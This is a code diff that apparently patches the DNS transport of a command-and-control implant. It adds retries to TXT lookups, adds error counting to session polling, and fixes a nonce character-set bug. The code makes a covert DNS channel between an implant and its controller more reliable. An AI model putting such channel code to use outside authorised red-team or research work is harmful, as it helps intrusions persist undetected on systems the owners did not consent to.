@@ -71,9 +71,8 @@ const (
 )
 
 var (
-	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
-
-	pollInterval = 1 * time.Second
+	//Removed "-" because it appears a nonce that ends in "-" is invalid and thus breaks comms
+	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789_")
 
 	replayMutex = &sync.RWMutex{}
 	replay      = &map[string]bool{}
@@ -119,17 +118,27 @@ func isReplayAttack(ciphertext []byte) bool {
 // --------------------------- DNS SESSION SEND ---------------------------
 
 func dnsLookup(domain string) (string, error) {
+	var err error
+	var txts []string
+
 	// {{if .Config.Debug}}
 	log.Printf("[dns] lookup -> %s", domain)
 	// {{end}}
-	txts, err := net.LookupTXT(domain)
-	if err != nil || len(txts) == 0 {
-		// {{if .Config.Debug}}
-		log.Printf("[!] failure -> %s", domain)
-		// {{end}}
-		return "", err
+	for retry_count := 0; retry_count < 3; retry_count++ {
+		txts, err = net.LookupTXT(domain)
+		if err != nil || len(txts) == 0 {
+			// {{if .Config.Debug}}
+			log.Printf("[!] failure -> %s", domain)
+			// {{end}}
+		} else {
+			break
+		}
 	}
-	return strings.Join(txts, ""), nil
+	if err != nil || len(txts) == 0 {
+		return "", err
+	} else {
+		return strings.Join(txts, ""), nil
+	}
 }
 
 // Send raw bytes of an arbitrary length to the server
@@ -341,6 +350,7 @@ func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AE
 // --------------------------- DNS SESSION RECV ---------------------------
 
 func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
+	error_counter := 0
 	for {
 		select {
 		case <-ctrl:
@@ -353,7 +363,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 				// {{if .Config.Debug}}
 				log.Printf("Lookup error %v", err)
 				// {{end}}
+				error_counter += 1
+				if error_counter > 3 {
+					return
+				}
+			} else {
+				error_counter = 0
 			}
+
 			if txt == "0" {
 				continue
 			}
